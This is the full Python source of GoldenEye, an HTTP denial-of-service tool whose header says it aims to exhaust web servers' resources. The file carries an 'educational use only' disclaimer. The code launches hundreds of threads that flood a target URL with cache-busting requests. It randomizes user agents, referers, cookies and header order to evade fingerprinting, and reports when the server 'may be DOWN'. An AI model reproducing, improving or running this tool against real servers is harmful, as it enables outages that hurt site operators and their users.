#!/usr/bin/env python

"""
$Id: $

     /$$$$$$            /$$       /$$                     /$$$$$$$$                    
    /$$__  $$          | $$      | $$                    | $$_____/                    
   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$ 
   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                     /$$  | $$          
                                                                    |  $$$$$$/          
                                                                     \______/           
                                                                                                                                                                                                      


This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

@date 2012-05-31
@version 1.4

@TODO Test in python 3.x

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

import threading, urlparse, ssl
import sys, getopt, random, time

# Python version-specific 
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    HTTPCLIENT = httplib
else:
    # Python 3.x
    import http.client
    HTTPCLIENT = http.client

####
# Config
####
DEBUG = False

####
# Constants
####
METHOD_GET  = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

####
# GoldenEye Class
####

class GoldenEye(object):

    # Counters
    request_counter=0
    last_request_counter=0
    failed_counter=0
    last_failed_counter=0

    # Containers
    threadsQueue = []

    # Properties
    url = None

    # Options
    nr_threads = 500
    method = METHOD_GET
    unstoppable = False

    def __init__(self, url):

        # Set URL
        self.url = url

    def exit(self):
        self.stats()
        print "Shutting down GoldenEye"

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print "GoldenEye firing!"

    # Do the fun!
    def fire(self):

        self.printHeader()
        print "Hitting webserver in mode {0} with {1} threads".format(self.method, self.nr_threads)

        if DEBUG:
            print "Starting {0} concurrent Laser threads".format(self.nr_threads)

        # Start threads
        for i in range(int(self.nr_threads)):

            thread = Punch(self.url)
            thread.method = self.method
            thread.unstoppable = self.unstoppable

            self.threadsQueue.append(thread)
            thread.start()

        print "Initiating monitor"
        self.monitor()

    def stats(self):
        if self.request_counter > 0 or self.failed_counter > 0:

            print "{0} GoldenEye punches deferred. ({1} Failed)".format(self.request_counter, self.failed_counter)

            if self.request_counter > 0 and self.failed_counter > 0 and self.last_request_counter == self.request_counter and self.failed_counter > self.last_failed_counter:
                print "\tServer may be DOWN!"

            self.last_request_counter = self.request_counter
            self.last_failed_counter = self.failed_counter

    def monitor(self):
        while len(self.threadsQueue) > 0:
            try:
                for thread in self.threadsQueue:
                    if thread is not None and thread.isAlive():
                        self.request_counter += thread.currentCounter()
                        self.failed_counter += thread.currentFailedCounter()
                        thread.join(.1)
                    else:
                        self.threadsQueue.remove(thread)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "CTRL+C received. Killing all threads"
                for thread in self.threadsQueue:
                    try:
                        if DEBUG:
                            print "Killing thread {0}".format(thread.getName())
                        thread.stop()
                    except Exception, ex:
                        pass # silently ignore

####
# Punch Class
####

class Punch(threading.Thread):

        
    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []

    # Flags
    runnable = True

    # Options
    method = METHOD_GET
    unstoppable = False

    def __init__(self, url):

        super(Punch, self).__init__()

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443

        self.referers = [ 
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q=',
            'http://' + self.host + '/'
            ]


        self.useragents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
            ]

    def __del__(self):
        self.stop()


    def run(self):

        try:

            if DEBUG:
                print "Starting thread {0}".format(self.getName())

            self.attack()

            if DEBUG:
                print "Thread {0} completed run. Sleeping...".format(self.getName())

        except:
            raise

    #builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def attack(self):

        while self.runnable:

            try:

                if self.ssl:
                    c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                else:
                    c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                (url, headers) = self.createPayload()

                method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                c.request(method.upper(), url, None, headers)

                resp = c.getresponse()

                self.incCounter()
            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore
            else:
                if c:
                    c.close()


    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)
            
    
    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = '?'):

        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def generateRandomHeaders(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'must-revalidate']
        random.shuffle(noCacheDirectives)
        noCache = ', '.join(noCacheDirectives)

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(0,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(110,120),
            'Host': self.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            http_headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5,10))

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    # Housekeeping
    def stop(self):
        self.runnable = False
        self._Thread__stop()

    # Counter Functions
    def incCounter(self):
        self.request_count += 1

    def incFailed(self):
        self.failed_count += 1

    def currentCounter(self, reset=True):
        currentCount = self.request_count
        if reset:
            self.request_count = 0
        return currentCount
        
    def currentFailedCounter(self, reset=True):
        currentCount = self.failed_count
        if reset:
            self.failed_count = 0
        return currentCount
        

####

####
# Other Functions
####

def usage():
    print
    print '-----------------------------------------------------------------------------------------------------------'
    print ' USAGE: ./goldeneye.py <url> [OPTIONS]'
    print
    print ' OPTIONS:'
    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
    print '\t -t, --threads\t\tNumber of concurrent threads\t\t\t\t(default: 500)'
    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t\t(default: get)'
    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
    print '\t -h, --help\t\tShows this help'
    print '-----------------------------------------------------------------------------------------------------------'

    
def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)

####
# Main
####

def main():
    
    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        opts, args = getopt.getopt(sys.argv[2:], "dht:m:u", ["debug", "help", "threads", "method", "unstoppable" ])

        threads = 500
        url = sys.argv[1]
        method = METHOD_GET
        unstoppable = False

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--unstoppable"):
                unstoppable = True
            elif o in ("-t", "--threads"):
                threads = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")

        if url == None:
                error("No URL supplied")

        goldeneye = GoldenEye(url)
        goldeneye.nr_threads = threads
        goldeneye.method = method
        goldeneye.unstoppable = unstoppable

        goldeneye.fire()

    except getopt.GetoptError, err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
